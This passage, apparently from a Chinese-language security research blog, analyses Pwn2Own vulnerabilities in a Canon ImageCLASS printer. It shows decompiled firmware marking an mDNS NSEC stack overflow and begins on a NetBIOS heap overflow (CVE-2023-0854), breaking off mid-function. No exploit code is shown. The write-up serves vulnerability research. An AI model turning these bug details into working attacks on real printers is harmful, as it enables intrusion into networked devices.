      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;consume_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------- [1]  stack overflow &lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Áï∂‰ªñÂú®ËôïÁêÜ NSEC(47) ÁöÑ Record ÊôÇÔºå‰∏¶Ê≤íÊúâÊ™¢Êü•Èï∑Â∫¶Â∞±Áõ¥Êé•Ë§áË£Ω data Âà∞ local buffer(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsec_buf[256]&lt;/code&gt;) ÔºåÂ¶Ç‰∏äËø∞Á®ãÂºèÁ¢ºÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt;ÔºåÂ∞éËá¥ stack overflow&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôË£°Âà©Áî®ÊñπÊ≥ïËàá Pwn2Own 2021 Austin ÊôÇ&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;Áõ∏Âêå&lt;/a&gt;ÔºåÈÄôÈÇäÂ∞±‰∏çÂú®Â§öÂÅöÊïòËø∞„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;netbios-cve-2023-0854&quot;&gt;NetBIOS (CVE-2023-0854)&lt;/h4&gt;

&lt;p&gt;Âú® NetBIOS ‰∏≠‰∏ªË¶ÅÊèê‰æõ‰∏ãÂàó‰∏âÁ®Æ‰∏çÂêåÁöÑÊúçÂãô:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Name service (NetBIOS-NS) : Port 137/TCP and 137/UDP&lt;/li&gt;
  &lt;li&gt;Datagram distribution service (NetBIOS-DGM) : Port 138/UDP&lt;/li&gt;
  &lt;li&gt;Session service (NetBIOS-SSN) : Port 139/TCP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÄôÈÇäÊàëÂÄëÂ∞áÊúÉÊääÈáçÈªûÊîæÂú® NetBIOS-NS ‰∏≠ÔºåNetBIOS-NS ‰πüÊúÉÊèê‰æõÂçÄÁ∂≤‰∏≠ÂüüÂêçËß£ÊûêÁöÑÊúçÂãôÔºåÂ∏∏Ë¶ãÊñº Windows ‰ΩúÊ•≠Á≥ªÁµ±‰∏≠ÔºåËÄåË©≤Â∞ÅÂåÖÊ†ºÂºè‰πüÊòØÂü∫Êñº DNS ÁöÑÂ∞ÅÂåÖ„ÄÇÂÖ∂Ë©≥Á¥∞ÂÖßÂÆπÂÆöÁæ©Êñº &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt; ‰∏≠&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The packet format:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         NAME_TRN_ID           | OPCODE  |   NM_FLAGS  | RCODE |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          QDCOUNT              |           ANCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          NSCOUNT              |           ARCOUNT             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://datatracker.ietf.org/doc/html/rfc1002)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ËÄå Query ÂâáÊúÉË¢´ÊîæÂú® header ‰πãÂæå&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   + ------                                                ------- +
   |                            HEADER                             |
   + ------                                                ------- +
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                       QUESTION ENTRIES                        /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                    ANSWER RESOURCE RECORDS                    /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                  AUTHORITY RESOURCE RECORDS                   /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                  ADDITIONAL RESOURCE RECORDS                  /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://datatracker.ietf.org/doc/html/rfc1002)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂÖ∂‰∏≠ÊàëÂÄëÂè™È†àÈóúÊ≥®Êñº Question Entries Ê¨Ñ‰Ωç&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Question Section:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               |
   /                         QUESTION_NAME                         /
   /                                                               /
   |                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         QUESTION_TYPE         |        QUESTION_CLASS         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Question Name ÈÉΩÊòØÁî±Ë®±Â§ö label ÁµÑÊàêÔºåÊØèÂÄã label ÈÉΩÂ¶ÇÂêåÂâçËø∞ LLMNR ÊâÄËø∞ÔºåÈÉΩÊòØÈï∑Â∫¶Âä†‰∏äÂ≠ó‰∏≤ÁöÑÁµÑÂêà„ÄÇÂÖ∂È§òÊ¨Ñ‰ΩçÂâá‰∏çÂè¶Â§ñÂ§öÂä†ÊïòËø∞ÔºåË©≥Á¥∞ÂÖßÂÆπÂèØÂèÉËÄÉ &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1002&quot;&gt;RFC1002&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ÊºèÊ¥û‰ΩçÁΩÆ&lt;/strong&gt;
Áï∂ Canon ImageCLASS MF743Cdw Âú®ËôïÁêÜ NetBIOS Â∞ÅÂåÖÁöÑ Question Ê¨Ñ‰ΩçÊôÇÔºåÊ≤íÊúâÊ≠£Á¢∫Ê™¢Êü•Èï∑Â∫¶Â∞éËá¥ Heap Overflow „ÄÇ&lt;/p&gt;

&lt;p&gt;ÂÖ∂ÊºèÊ¥û‰ΩçÁΩÆÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; ‰∏≠ÔºåÊàëÂÄëÂèØÈÄèÈÅé ndNameProcessExternalMessage Ëß∏Áôº„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÈÄôÈÇäÂ∞±Á®çÂæÆ‰æÜÂàÜÊûê‰∏Ä‰∏ãÊºèÊ¥ûÊàêÂõ†:&lt;/p&gt;

&lt;p&gt;Áï∂ Canon ‰∏≠ÁöÑ NetBIOS ÊúçÂãôÂïüÂãïÊôÇÔºåÊúÉÂÖàÂéªÂàùÂßãÂåñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buffer&lt;/code&gt; Ôºå‰∏¶ÂàÜÈÖç 0xff Â§ßÂ∞èÁ©∫ÈñìÁµ¶Ë©≤ buffer„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3194&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Áï∂Êé•Êî∂Âà∞‰æÜËá™ 137/UDP ÁöÑ NetBIOS Â∞ÅÂåÖÊôÇÔºåÂ∞±ÊúÉÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage &lt;/code&gt; ‰æÜËôïÁêÜÂ∞ÅÂåÖ&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameProcessExternalMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-28h] BYREF&lt;/span&gt;

